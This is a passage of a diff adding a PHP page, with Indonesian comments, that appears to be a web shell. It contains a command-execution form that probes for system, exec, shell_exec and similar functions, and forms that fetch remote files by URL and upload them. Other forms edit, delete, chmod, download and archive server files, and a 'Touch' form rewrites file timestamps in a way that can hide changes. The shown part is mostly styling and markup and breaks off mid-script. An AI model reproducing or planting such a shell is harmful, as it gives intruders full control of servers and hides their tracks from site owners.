+        }
+        
+        /* Perbaikan tampilan pesan */
+        .message-container {
+            position: fixed;
+            top: 40px;
+            right: 20px;
+            z-index: 1000;
+            max-width: 400px;
+        }
+        .message {
+            padding: 12px 20px;
+            margin-bottom: 10px;
+            border-radius: 4px;
+            font-weight: bold;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+            animation: slideIn 0.3s ease-out;
+
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+
+            /* Tambahkan properti untuk interaksi */
+            position: relative;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        /* Kelas untuk notifikasi yang diperluas */
+        .message.expanded {
+            white-space: normal;
+            max-height: none;
+        }
+        .message.success {
+            background-color: rgba(0, 255, 0, 0.2);
+            border-left: 4px solid #00FF00;
+            color: #00FF00;
+        }
+        .message.error {
+            background-color: rgba(255, 0, 0, 0.2);
+            border-left: 4px solid #ff0000;
+            color: #ff0000;
+        }
+        @keyframes slideIn {
+            from {
+                transform: translateX(100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+        .message-close {
+            float: right;
+            cursor: pointer;
+            font-weight: bold;
+            margin-left: 15px;
+        }
+        
+        /* Tampilan untuk pilihan metode command - tanpa background */
+        .command-method-selector {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 10px;
+        }
+        .method-option {
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            font-size: 14px;
+            color: #ccc;
+        }
+        .method-option input[type="radio"] {
+            margin-right: 6px;
+            cursor: pointer;
+        }
+        .method-option:hover {
+            color: #ff6666;
+        }
+        .method-option input[type="radio"]:checked + span {
+            color: #ff6666;
+            font-weight: bold;
+        }
+        
+        /* Keterangan untuk file info */
+        .file-info-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        .file-info-details {
+            font-size: 12px;
+            color: #aaa;
+        }
+        
+        input[type="text"], input[type="password"], textarea {
+            background: black !important;
+            border: 1px solid #444 !important;
+            color: white !important;
+            padding: 4px !important;
+            font-size: 14px !important;
+            cursor: text !important;
+            transition: border-color 0.3s ease !important;
+        }
+
+        input[type="text"]:focus, input[type="password"]:focus, textarea:focus {
+            border-color: #ff6666 !important;
+            outline: none !important;
+        }
+
+        input[type="text"]::placeholder, input[type="password"]::placeholder, textarea::placeholder {
+            color: #ccc !important;
+        }
+
+        /* CSS khusus untuk input Chmod */
+        input[name="chmod_value"] {
+            width: 50px !important;
+            vertical-align: middle !important;
+            text-align: center !important;
+            font-family: monospace !important;
+        }
+        
+        /* Style untuk form edit yang diperbaiki */
+        .edit-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            border-bottom: 1px solid #444;
+            padding-bottom: 10px;
+        }
+        
+        .edit-path {
+            color: #ff6666;
+            font-weight: bold;
+        }
+        
+        .edit-footer {
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+            margin-top: 15px;
+            border-top: 1px solid #444;
+            padding-top: 10px;
+        }
+        
+        .edit-actions {
+            display: flex;
+            gap: 10px;
+        }
+        
+        /* Style untuk form touch yang minimalis */
+        .touch-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .touch-title {
+            color: #ff6666;
+            font-weight: bold;
+            margin-bottom: 15px;
+            font-size: 16px;
+        }
+        
+        .touch-form-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .touch-actions {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        /* Efek khusus untuk selain baris navigasi */
+        tbody tr:not(.nav-row):hover {
+            background-color: #333 !important;
+        }
+
+        /* Tambahkan class untuk baris navigasi */
+        .nav-row:hover {
+            background-color: transparent !important;
+            cursor: default;
+            border-left: none;
+        }
+
+        /* Efek untuk checkbox saat hover */
+        .file-row input[type="checkbox"]:hover {
+            cursor: pointer;
+        }
+
+        /* CSS untuk input Chmod dengan warna sama seperti Rename to */
+        input[name="chmod_value"] {
+            background: black !important;
+            border: 1px solid #444 !important;
+            color: white !important;
+            padding: 4px !important;
+            font-size: 14px !important;
+            cursor: text !important;
+            width: 50px !important;
+            vertical-align: middle !important;
+            text-align: center !important;
+            font-family: monospace !important;
+        }
+
+        input[name="chmod_value"]:focus {
+            border-color: #ff6666 !important;
+            outline: none !important;
+        }
+
+        input[name="chmod_value"]::placeholder {
+            color: #ccc !important;
+        }
+
+        /* Efek untuk checkbox saat hover */
+        .file-row input[type="checkbox"]:hover {
+            cursor: pointer;
+        }
+
+        /* CSS untuk semua input form dengan border merah saat focus */
+        input[type="text"], input[type="password"], textarea {
+            background: black !important;
+            border: 1px solid #444 !important;
+            color: white !important;
+            padding: 4px !important;
+            font-size: 14px !important;
+            cursor: text !important;
+            transition: border-color 0.3s ease !important;
+        }
+
+        input[type="text"]:focus, input[type="password"]:focus, textarea:focus {
+            border-color: #ff6666 !important;
+            outline: none !important;
+        }
+
+        input[type="text"]::placeholder, input[type="password"]::placeholder, textarea::placeholder {
+            color: #ccc !important;
+        }
+
+        /* CSS khusus untuk input Chmod */
+        input[name="chmod_value"] {
+            width: 50px !important;
+            vertical-align: middle !important;
+            text-align: center !important;
+            font-family: monospace !important;
+        }
+
+        /* Custom file input untuk Upload */
+        .file-input-wrapper {
+            position: relative;
+            display: inline-flex;
+            align-items: center;
+            border-bottom: 1px solid #555;
+            padding-bottom: 4px;
+            min-width: 220px;
+            margin-right: 10px;
+        }
+
+        .file-input-wrapper input[type="file"] {
+            position: absolute;
+            left: 0;
+            top: 0;
+            opacity: 0;
+            width: 100%;
+            height: 100%;
+            cursor: pointer;
+        }
+
+        .file-input-label {
+            padding: 6px 8px;
+            background: transparent;
+            color: #ddd;
+            font-size: 14px;
+            cursor: pointer;
+            transition: color 0.3s ease;
+            width: 100%;
+            font-family: monospace;
+        }
+
+        .file-input-label:hover {
+            color: #fff;
+        }
+
+        .file-input-label:active {
+            color: #d33;
+        }
+
+        /* Style untuk tombol Apply dan Upload */
+        .btn-apply, .btn-upload {
+            background: linear-gradient(135deg, #b22222, #d33);
+            border: none;
+            color: #fff;
+            padding: 6px 14px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.3s ease, transform 0.1s;
+            font-weight: bold;
+            font-family: monospace;
+        }
+
+        .btn-apply:hover, .btn-upload:hover {
+            background: linear-gradient(135deg, #d33, #e74c3c);
+        }
+
+        .btn-apply:active, .btn-upload:active {
+            transform: scale(0.97);
+        }
+
+        /* Custom select untuk Pilih aksi */
+        select[name="bulk_action"] {
+            padding: 6px 8px;
+            border: none;
+            background: #222; /* Mengganti background dari transparent ke #222 */
+            color: #ddd;
+            outline: none;
+            font-size: 14px;
+            transition: color 0.2s, border-color 0.2s;
+            border-bottom: 1px solid #555;
+            min-width: 220px;
+            font-family: monospace;
+            border-radius: 4px; /* Menambahkan radius untuk tampilan yang lebih baik */
+        }
+
+        select[name="bulk_action"]:hover {
+            color: #fff;
+            background: #333; /* Menambahkan background saat hover */
+        }
+
+        select[name="bulk_action"]:focus {
+            color: #fff;
+            border-bottom: 1px solid #d33;
+            background: #333; /* Menambahkan background saat focus */
+        }
+
+        /* Menambahkan styling untuk opsi dropdown */
+        select[name="bulk_action"] option {
+            background: #222;
+            color: #ddd;
+        }
+
+        select[name="bulk_action"] option:hover {
+            background: #444;
+            color: #fff;
+        }
+
+
+        /* Custom file input untuk Upload */
+        .file-input-wrapper {
+            position: relative;
+            display: inline-flex;
+            align-items: center;
+            border-bottom: 1px solid #555;
+            padding-bottom: 4px;
+            min-width: 220px;
+            margin-right: 10
+        }
+
+        /* CSS untuk modal konfirmasi */
+        #confirmModal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.7);
+            font-family: monospace;
+        }
+
+        #confirmModal .modal-content {
+            background-color: #222;
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid #444;
+            width: 350px;
+            text-align: center;
+            border-radius: 5px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.5);
+        }
+
+        #confirmModal h3 {
+            margin-top: 0;
+            color: #ff6666;
+            font-family: monospace;
+        }
+
+        #confirmModal p {
+            color: white;
+            margin: 15px 0;
+            font-family: monospace;
+        }
+
+        #confirmModal .modal-buttons {
+            margin-top: 20px;
+        }
+
+        #confirmModal button {
+            background: #aa2222;
+            border: none;
+            color: white;
+            padding: 8px 20px;
+            margin: 0 10px;
+            cursor: pointer;
+            border-radius: 3px;
+            font-family: monospace;
+            transition: background 0.3s;
+        }
+
+        #confirmModal button:hover {
+            background: #dd4444;
+        }
+
+        #confirmModal #confirmNo {
+            background: #444;
+        }
+
+        #confirmModal #confirmNo:hover {
+            background: #666;
+        }
+    </style>
+</head>
+<body>
+
+<?php
+if (isset($_SESSION['delete_debug_message'])) {
+    echo '<div class="debug-message">' . $_SESSION['delete_debug_message'] . '</div>';
+    unset($_SESSION['delete_debug_message']);
+}
+?>
+
+<div>
+    <strong>Current Directory:</strong> <?php echo makeBreadcrumb($current_dir); ?>
+    <form method="POST" style="display:inline;">
+        <button type="submit" name="go_dir" value="<?php echo htmlspecialchars(getcwd()); ?>" style="background:none;border:none;color:#ff6666;cursor:pointer;padding:0;margin-left:10px;">[ Home ]</button>
+    </form>
+</div>
+<hr>
+
+<!-- Container untuk pesan sukses/error -->
+<div class="message-container" id="messageContainer"></div>
+
+<div class="command-form">
+    <h3>Execute Command</h3>
+    <?php 
+    $any_exec = false;
+    foreach(['system','exec','passthru','shell_exec','popen','proc_open'] as $f) { if(function_exists($f)) { $any_exec = true; break; } }
+    if ($any_exec): ?>
+        <form method="POST" style="margin-bottom:10px;">
+            <input type="text" name="command" style="width:80%" required placeholder="id | whoami | dir | ls -la ...">
+            <input type="submit" value="Execute" class="btn-upload">
+        </form>
+    <?php else: ?>
+        <div style="color: #ff6666; margin-bottom: 10px;">Command execution is not available on this server.</div>
+    <?php endif; ?>
+    
+    <?php if ($cmdout): ?>
+        <div class="command-output"><?php echo $cmdout; ?></div>
+    <?php endif; ?>
+</div>
+
+<!-- Form Edit -->
+<div id="editFormContainer" class="form-container">
+    <div class="edit-header">
+        <h3>Edit: <span id="editFileName" class="edit-path"></span></h3>
+    </div>
+    <form method="POST" class="edit-form" id="editForm">
+        <input type="hidden" name="save_edit_file" id="saveEditPath">
+        <textarea name="edit_content" id="editContent"></textarea>
+    </form>
+    <div class="edit-footer">
+        <div class="edit-actions">
+            <input type="submit" form="editForm" value="Save">
+            <input type="button" value="Cancel" onclick="hideEditForm()">
+        </div>
+    </div>
+</div>
+
+<div class="action-row">
+    <form method="POST">
+        <input type="text" name="get_file_url" placeholder="URL Link" required style="width:200px;">
+        <input type="text" name="get_file_name" placeholder="Nama File" required style="width:150px;">
+        <input type="submit" value="Get">
+    </form>
+    
+    <form method="POST" enctype="multipart/form-data" style="display:inline-flex; align-items: center;">
+        <div class="file-input-wrapper">
+            <label for="uploadfile" class="file-input-label" id="fileLabel">Choose file...</label>
+            <input type="file" name="uploadfile" id="uploadfile" onchange="updateFileName(this)" required>
+        </div>
+        <input type="submit" value="Upload" class="btn-upload">
+    </form>
+
+    <form method="POST">
+        <input type="text" name="newfolder_name" placeholder="Nama folder baru" required>
+        <input type="submit" value="Buat Folder">
+    </form>
+
+    <form method="POST">
+        <input type="text" name="newfile_name" placeholder="Nama file baru" required>
+        <input type="submit" name="create_file" value="Buat File">
+    </form>
+
+    <form method="POST" id="deleteActionForm">
+        <input type="hidden" name="delete_single_item" value="1">
+        <input type="text" name="delete_item_name" placeholder="Path file/folder untuk dihapus" required>
+        <button type="button" onclick="showDeleteActionConfirm()" class="action-btn">Hapus File/Folder</button>
+    </form>
+</div>
+
+<!-- View File Section -->
+<div id="viewFileSection" class="form-container" style="<?php echo ($view_file !== null && $edit_file === null) ? 'display: block;' : 'display: none;'; ?>">
+    <div class="file-info-container">
+        <h3>Viewing File: <?php echo htmlspecialchars($view_file); ?></h3>
+    </div>
+    <pre class="file-content"><?php echo htmlspecialchars($view_content); ?></pre>
+    <div class="actions-cell view-actions">
+        <form method="POST" style="display:inline;">
+            <input type="hidden" name="download" value="<?php echo htmlspecialchars($view_file); ?>">
+            <button type="submit" class="action-btn">Download</button>
+        </form>
+        <form method="POST" style="display:inline;" id="chmodFormView">
+            <input type="hidden" name="chmod" value="<?php echo htmlspecialchars($view_file); ?>">
+            <input type="text" name="chmod_value" placeholder="<?php echo getPermsOctal($view_file); ?>" pattern="[0-7]{3,4}" required style="width:50px; vertical-align: middle;" value="<?php echo getPermsOctal($view_file); ?>">
+            <button type="button" onclick="showChmodConfirm('chmodFormView', '<?php echo htmlspecialchars(basename($view_file)); ?>')" class="action-btn">Chmod</button>
+        </form>
+        <form method="POST" style="display:inline;">
+            <input type="hidden" name="rename" value="<?php echo htmlspecialchars($view_file); ?>">
+            <input type="text" name="rename_new" placeholder="Rename to" required style="width:120px; vertical-align: middle;">
+            <button type="submit" class="action-btn">Rename</button>
+        </form>
+        <form method="POST" style="display:inline;" onsubmit="return false;">
+            <input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($view_file); ?>">
+            <button type="button" class="action-btn" onclick="showEditForm('<?php echo htmlspecialchars($view_file); ?>')">Edit</button>
+        </form>
+        <form method="POST" style="display:inline;" onsubmit="return false;">
+            <input type="hidden" name="touch_file" value="<?php echo htmlspecialchars($view_file); ?>">
+            <button type="button" class="action-btn" onclick="showTouchForm('<?php echo htmlspecialchars($view_file); ?>', '<?php echo date("Y-m-d H:i:s", filemtime($view_file)); ?>')">Touch</button>
+        </form>
+        <form method="POST" style="display:inline;">
+            <input type="hidden" name="close_view_file" value="1">
+            <button type="submit" class="action-btn">Close</button>
+        </form>
+    </div>
+</div>
+
+<!-- Form Touch -->
+<div id="touchFormContainer" class="form-container">
+    <div class="touch-container">
+        <div class="touch-title">Touch: <span id="touchFileName"></span></div>
+        <div class="touch-form-content">
+            <form method="POST" class="touch-form" id="touchForm">
+                <input type="hidden" name="save_touch" id="saveTouchPath">
+                <input type="text" name="touch_value" id="touchValue" class="touch-input" pattern="\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}" required>
+            </form>
+            <div class="touch-actions">
+                <input type="submit" form="touchForm" value="Save">
+                <input type="button" value="Cancel" onclick="hideTouchForm()">
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Modal Konfirmasi -->
+<div id="confirmModal">
+    <div class="modal-content">
+        <h3>Confirm Action</h3>
+        <p id="confirmMessage">Are you sure you want to proceed?</p>
+        <div class="modal-buttons">
+            <button id="confirmYes">Yes</button>
+            <button id="confirmNo">No</button>
+        </div>
+    </div>
+</div>
+
+<form method="POST" id="bulkForm">
+    <table>
+        <thead>
+            <tr>
+                <th class="checkbox-col"><input type="checkbox" id="checkAll" title="Pilih semua"></th>
+                <th>Nama</th>
+                <th>Ukuran</th>
+                <th>User:Group</th>
+                <th>Izin</th>
+                <th>Dimodifikasi</th>
+                <th class="actions-cell">Aksi</th>
+            </tr>
+        </thead>
+        <tbody>
+<!-- Baris navigasi untuk direktori saat ini (.) -->
+<tr class="nav-row">
+    <td class="checkbox-col"></td>
+    <td>
+        <form method="POST" style="display:inline;">
+            <button type="submit" name="go_dir" value="<?php echo htmlspecialchars($current_dir); ?>" style="background:none;border:none;color:#ff6666;cursor:pointer;padding:0;">.</button>
+        </form>
+    </td>
+    <td>Directory</td>
+    <td>
+        <?php
+        $current_dir_owner = fileowner($current_dir);
+        $current_dir_group = filegroup($current_dir);
+        $current_dir_owner_name = function_exists('posix_getpwuid') ? posix_getpwuid($current_dir_owner)['name'] : $current_dir_owner;
+        $current_dir_group_name = function_exists('posix_getgrgid') ? posix_getgrgid($current_dir_group)['name'] : $current_dir_group;
+        echo htmlspecialchars($current_dir_owner_name . ':' . $current_dir_group_name);
+        ?>
+    </td>
+    <td>
+        <?php
+        $current_dir_perms = fileperms($current_dir);
+        echo permsToString($current_dir_perms, $current_dir, $current_uid, $current_gid);
+        ?>
+    </td>
+    <td>
+        <span class="clickable-date" onclick="showTouchForm('<?php echo htmlspecialchars($current_dir); ?>', '<?php echo date("Y-m-d H:i:s", filemtime($current_dir)); ?>')">
+            <?php echo date("Y-m-d H:i:s", filemtime($current_dir)); ?>
+        </span>
+    </td>
+    <td class="actions-cell">
+        <form method="POST" style="display:inline;" id="chmodFormCurrent">
+            <input type="hidden" name="chmod" value="<?php echo htmlspecialchars($current_dir); ?>">
+            <input type="text" name="chmod_value" placeholder="<?php echo getPermsOctal($current_dir); ?>" pattern="[0-7]{3,4}" required style="width:50px; vertical-align: middle;" value="<?php echo getPermsOctal($current_dir); ?>">
+            <button type="button" onclick="showChmodConfirm('chmodFormCurrent', '<?php echo htmlspecialchars(basename($current_dir)); ?>')" class="action-btn">Chmod</button>
+        </form>
+    </td>
+</tr>
+
+<!-- Baris navigasi untuk direktori sebelumnya (..) -->
+<?php
+$parent_dir = dirname($current_dir);
+if ($parent_dir && is_dir($parent_dir) && $parent_dir !== $current_dir):
+?>
+<tr>
+    <td class="checkbox-col"></td>
+    <td>
+        <form method="POST" style="display:inline;">
+            <button type="submit" name="go_dir" value="<?php echo htmlspecialchars($parent_dir); ?>" style="background:none;border:none;color:#ff6666;cursor:pointer;padding:0;">..</button>
+        </form>
+    </td>
+    <td>Directory</td>
+    <td>
+        <?php
+        $parent_dir_owner = fileowner($parent_dir);
+        $parent_dir_group = filegroup($parent_dir);
+        $parent_dir_owner_name = function_exists('posix_getpwuid') ? posix_getpwuid($parent_dir_owner)['name'] : $parent_dir_owner;
+        $parent_dir_group_name = function_exists('posix_getgrgid') ? posix_getgrgid($parent_dir_group)['name'] : $parent_dir_group;
+        echo htmlspecialchars($parent_dir_owner_name . ':' . $parent_dir_group_name);
+        ?>
+    </td>
+    <td>
+        <?php
+        $parent_dir_perms = fileperms($parent_dir);
+        echo permsToString($parent_dir_perms, $parent_dir, $current_uid, $current_gid);
+        ?>
+    </td>
+    <td>
+        <span class="clickable-date" onclick="showTouchForm('<?php echo htmlspecialchars($parent_dir); ?>', '<?php echo date("Y-m-d H:i:s", filemtime($parent_dir)); ?>')">
+            <?php echo date("Y-m-d H:i:s", filemtime($parent_dir)); ?>
+        </span>
+    </td>
+    <td class="actions-cell">
+        <form method="POST" style="display:inline;" id="chmodFormParent">
+            <input type="hidden" name="chmod" value="<?php echo htmlspecialchars($parent_dir); ?>">
+            <input type="text" name="chmod_value" placeholder="<?php echo getPermsOctal($parent_dir); ?>" pattern="[0-7]{3,4}" required style="width:50px; vertical-align: middle;" value="<?php echo getPermsOctal($parent_dir); ?>">
+            <button type="button" onclick="showChmodConfirm('chmodFormParent', '<?php echo htmlspecialchars(basename($parent_dir)); ?>')" class="action-btn">Chmod</button>
+        </form>
+    </td>
+</tr>
+<?php endif; ?>
+
+<?php
+$items = scandir($current_dir);
+$folders = array();
+$files = array();
+foreach ($items as $item) {
+    if ($item === '.' || $item === '..') continue;
+    $fullpath = $current_dir . DIRECTORY_SEPARATOR . $item;
+    if (is_dir($fullpath)) {
+        $folders[] = $item;
+    } else {
+        $files[] = $item;
+    }
+}
+
+$current_uid = function_exists('posix_geteuid') ? posix_geteuid() : null;
+$current_gid = function_exists('posix_getegid') ? posix_getegid() : null;
+
+$i = 0;
+foreach ($folders as $item):
+    $fullpath = $current_dir . DIRECTORY_SEPARATOR . $item;
+    $perms_octal = fileperms($fullpath);
+    $perms_string = permsToString($perms_octal, $fullpath, $current_uid, $current_gid);
+    $size = 'Directory';
+    $mod = date("Y-m-d H:i:s", filemtime($fullpath));
+
+    $owner_id = fileowner($fullpath);
+    $group_id = filegroup($fullpath);
+    $owner_name = function_exists('posix_getpwuid') ? posix_getpwuid($owner_id)['name'] : $owner_id;
+    $group_name = function_exists('posix_getgrgid') ? posix_getgrgid($group_id)['name'] : $group_id;
+
+    $user_group_class = (($owner_id !== $current_uid || $group_id !== $current_gid) && ($current_uid !== null || $current_gid !== null)) ? 'user-group-diff' : '';
+?>
+<tr>
+    <td class="checkbox-col"><input type="checkbox" name="items[]" value="<?php echo htmlspecialchars($fullpath); ?>"></td>
+    <td>
+        <form method="POST" style="display:inline;">
+            <button type="submit" name="go_dir" value="<?php echo htmlspecialchars($fullpath); ?>" style="background:none;border:none;color:#ff6666;cursor:pointer;padding:0;">
+                <?php echo htmlspecialchars($item); ?>
+            </button>
+        </form>
+    </td>
+    <td><?php echo $size; ?></td>
+    <td class="<?php echo $user_group_class; ?>"><?php echo htmlspecialchars($owner_name . ':' . $group_name); ?></td>
+    <td><?php echo $perms_string; ?></td>
+    <td><span class="clickable-date" onclick="showTouchForm('<?php echo htmlspecialchars($fullpath); ?>', '<?php echo htmlspecialchars($mod); ?>')"><?php echo $mod; ?></span></td>
+    <td class="actions-cell">
+        <form method="POST" style="display:inline;" id="chmodForm<?php echo $i; ?>">
+            <input type="hidden" name="chmod" value="<?php echo htmlspecialchars($fullpath); ?>">
+            <input type="text" name="chmod_value" placeholder="<?php echo getPermsOctal($fullpath); ?>" pattern="[0-7]{3,4}" required style="width:50px; vertical-align: middle;" value="<?php echo getPermsOctal($fullpath); ?>">
+            <button type="button" onclick="showChmodConfirm('chmodForm<?php echo $i; ?>', '<?php echo htmlspecialchars(basename($fullpath)); ?>')" class="action-btn">Chmod</button>
+        </form>
+        <form method="POST" style="display:inline;">
+            <input type="hidden" name="rename" value="<?php echo htmlspecialchars($fullpath); ?>">
+            <input type="text" name="rename_new" placeholder="Rename to" required style="width:120px; vertical-align: middle;">
+            <button type="submit" class="action-btn">Rename</button>
+        </form>
+        <!-- Untuk folder -->
+        <form method="POST" style="display:inline;" id="deleteForm<?php echo $i; ?>">
+            <input type="hidden" name="delete_single_item" value="1">
+            <input type="hidden" name="delete_item_name" value="<?php echo htmlspecialchars($fullpath); ?>">
+            <button type="button" onclick="showDeleteConfirm('deleteForm<?php echo $i; ?>', '<?php echo htmlspecialchars($item); ?>', 'folder')" class="action-btn">Delete</button>
+        </form>
+    </td>
+</tr>
+<?php 
+$i++;
+endforeach; ?>
+
+<?php
+foreach ($files as $item):
+    $fullpath = $current_dir . DIRECTORY_SEPARATOR . $item;
+    $perms_octal = fileperms($fullpath);
+    $perms_string = permsToString($perms_octal, $fullpath, $current_uid, $current_gid);
+    $size = formatSize(filesize($fullpath));
+    $mod = date("Y-m-d H:i:s", filemtime($fullpath));
+
+    $owner_id = fileowner($fullpath);
+    $group_id = filegroup($fullpath);
+    $owner_name = function_exists('posix_getpwuid') ? posix_getpwuid($owner_id)['name'] : $owner_id;
+    $group_name = function_exists('posix_getgrgid') ? posix_getgrgid($group_id)['name'] : $group_id;
+
+    $user_group_class = (($owner_id !== $current_uid || $group_id !== $current_gid) && ($current_uid !== null || $current_gid !== null)) ? 'user-group-diff' : '';
+?>
+<tr>
+    <td class="checkbox-col"><input type="checkbox" name="items[]" value="<?php echo htmlspecialchars($fullpath); ?>"></td>
+    <td>
+        <form method="POST" style="display:inline;">
+            <button type="submit" name="view_file" value="<?php echo htmlspecialchars($fullpath); ?>" style="background:none;border:none;color:white;cursor:pointer;padding:0;">
+                <?php echo htmlspecialchars($item); ?>
+            </button>
+        </form>
+    </td>
+    <td><?php echo $size; ?></td>
+    <td class="<?php echo $user_group_class; ?>"><?php echo htmlspecialchars($owner_name . ':' . $group_name); ?></td>
+    <td><?php echo $perms_string; ?></td>
+    <td><span class="clickable-date" onclick="showTouchForm('<?php echo htmlspecialchars($fullpath); ?>', '<?php echo htmlspecialchars($mod); ?>')"><?php echo $mod; ?></span></td>
+    <td class="actions-cell">
+        <form method="POST" style="display:inline;" id="chmodForm<?php echo $i; ?>">
+            <input type="hidden" name="chmod" value="<?php echo htmlspecialchars($fullpath); ?>">
+            <input type="text" name="chmod_value" placeholder="<?php echo getPermsOctal($fullpath); ?>" pattern="[0-7]{3,4}" required style="width:50px; vertical-align: middle;" value="<?php echo getPermsOctal($fullpath); ?>">
+            <button type="button" onclick="showChmodConfirm('chmodForm<?php echo $i; ?>', '<?php echo htmlspecialchars(basename($fullpath)); ?>')" class="action-btn">Chmod</button>
+        </form>
+        <form method="POST" style="display:inline;">
+            <input type="hidden" name="rename" value="<?php echo htmlspecialchars($fullpath); ?>">
+            <input type="text" name="rename_new" placeholder="Rename to" required style="width:120px; vertical-align: middle;">
+            <button type="submit" class="action-btn">Rename</button>
+        </form>
+        <form method="POST" style="display:inline;" onsubmit="return false;">
+            <input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($fullpath); ?>">
+            <button type="button" class="action-btn" onclick="showEditForm('<?php echo htmlspecialchars($fullpath); ?>')">Edit</button>
+        </form>
+        <!-- Untuk file -->
+        <form method="POST" style="display:inline;" id="deleteForm<?php echo $i; ?>">
+            <input type="hidden" name="delete_single_item" value="1">
+            <input type="hidden" name="delete_item_name" value="<?php echo htmlspecialchars($fullpath); ?>">
+            <button type="button" onclick="showDeleteConfirm('deleteForm<?php echo $i; ?>', '<?php echo htmlspecialchars($item); ?>', 'file')" class="action-btn">Delete</button>
+        </form>
+        <form method="POST" style="display:inline;">
+            <input type="hidden" name="download" value="<?php echo htmlspecialchars($fullpath); ?>">
+            <button type="submit" class="action-btn">Download</button>
+        </form>
+    </td>
+</tr>
+<?php 
+$i++;
+endforeach;
+?>
+        </tbody>
+    </table>
+    
+    <div class="action-row">
+        <select name="bulk_action">
+            <option value="">Pilih aksi</option>
+            <option value="delete">Delete</option>
+            <option value="zip">Compress (ZIP)</option>
+            <option value="tar">Compress (TAR.GZ)</option>
+            <option value="unzip">Extract (ZIP)</option>
+            <option value="untar">Extract (TAR.GZ)</option>
+        </select>
+        <input type="submit" value="Apply" class="btn-apply">
+    </div>
+</form>
+
+<script>
+function showMessage(message, type) {
+    const messageContainer = document.getElementById('messageContainer');
+    const messageElement = document.createElement('div');
+    messageElement.className = 'message ' + type;
+    messageElement.setAttribute('data-full-text', message);
+    messageElement.innerHTML = message + '<span class="message-close" onclick="this.parentElement.remove()">×</span>';
+    
+    // Tambahkan event listener untuk klik
+    messageElement.addEventListener('click', function(e) {
+        // Jangan ekspansi jika yang diklik adalah tombol close
+        if (!e.target.classList.contains('message-close')) {
+            this.classList.toggle('expanded');
+        }
+    });
+    
+    messageContainer.appendChild(messageElement);
+    
+    // Hapus pesan setelah 5 detik
+    setTimeout(() => {
+        messageElement.remove();
+    }, 5000);
+}
+
+// Tampilkan pesan dari session jika ada
+<?php if (isset($_SESSION['message'])): ?>
+    showMessage('<?php echo addslashes($_SESSION['message']['text']); ?>', '<?php echo $_SESSION['message']['type']; ?>');
+    <?php unset($_SESSION['message']); ?>
+<?php endif; ?>
+
+// Fungsi untuk checkbox select all
+document.getElementById('checkAll').addEventListener('change', function() {
+    const checkboxes = document.querySelectorAll('input[name="items[]"]');
+    checkboxes.forEach(checkbox => {
+        checkbox.checked = this.checked;
+    });
+});
+
+// Fungsi untuk scroll ke atas
+function scrollToTop() {
+    window.scrollTo({
+        top: 0,
+        behavior: 'smooth'
+    });
+}
+
+// Fungsi untuk menutup semua form
+function closeAllForms() {
+    document.getElementById('viewFileSection').style.display = 'none';
+    document.getElementById('editFormContainer').style.display = 'none';
+    document.getElementById('touchFormContainer').style.display = 'none';
+}
+
+// Fungsi untuk menampilkan form touch
+function showTouchForm(filePath, currentTimestamp) {
+    // Tutup semua form lain
+    closeAllForms();
+    
+    // Tampilkan form touch
+    document.getElementById('touchFormContainer').style.display = 'block';
+    document.getElementById('touchFileName').textContent = filePath;
+    document.getElementById('saveTouchPath').value = filePath;
+    document.getElementById('touchValue').value = currentTimestamp;
+    
+    // Scroll ke atas dengan sedikit delay untuk memastikan form sudah muncul
+    setTimeout(scrollToTop, 10);
+}
+
+// Fungsi untuk menyembunyikan form touch
+function hideTouchForm() {
+    document.getElementById('touchFormContainer').style.display = 'none';
+}
+
+// Fungsi untuk menampilkan form edit
+function showEditForm(filePath) {
+    // Tutup semua form lain
+    closeAllForms();
+    
+    // Tampilkan form edit
+    document.getElementById('editFormContainer').style.display = 'block';
+    
+    // Set nilai path file
+    document.getElementById('saveEditPath').value = filePath;
+    
+    // Set nama file
+    document.getElementById('editFileName').textContent = filePath;
+    
+    // Ambil konten file via AJAX
+    var xhr = new XMLHttpRequest();
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4) {
+            if (xhr.status === 200) {
+                document.getElementById('editContent').value = xhr.responseText;
+            } else {
+                alert('Gagal memuat konten file');
+            }
+        }
+    };
+    xhr.open('GET', '?get_file_content=' + encodeURIComponent(filePath), true);
+    xhr.send();
+    
+    // Scroll ke atas
+    scrollToTop();
+}
+
+// Tambahkan event listener untuk form edit
+document.addEventListener('DOMContentLoaded', function() {
+    const editForm = document.getElementById('editForm');
+    if (editForm) {
+        editForm.addEventListener('submit', function(e) {
+            const content = document.getElementById('editContent').value;
+            
+            // Jika konten kosong, tampilkan konfirmasi
+            if (content.trim() === '') {
+                e.preventDefault();
+                
+                if (confirm('Are you sure you want to save an empty file?')) {
+                    // Lanjutkan submit form
+                    this.submit();
+                }
+            }
+        });
+    }
+});
+
+// Fungsi untuk menyembunyikan form edit
+function hideEditForm() {
+    document.getElementById('editFormContainer').style.display = 'none';
+}
+
+// Override fungsi showTouchForm asli
+window.showTouchForm = function(filePath, currentTimestamp) {
+    // Tutup semua form lain
+    closeAllForms();
+    
+    // Tampilkan form touch
+    document.getElementById('touchFormContainer').style.display = 'block';
+    document.getElementById('touchFileName').textContent = filePath;
+    document.getElementById('saveTouchPath').value = filePath;
+    document.getElementById('touchValue').value = currentTimestamp;
+    
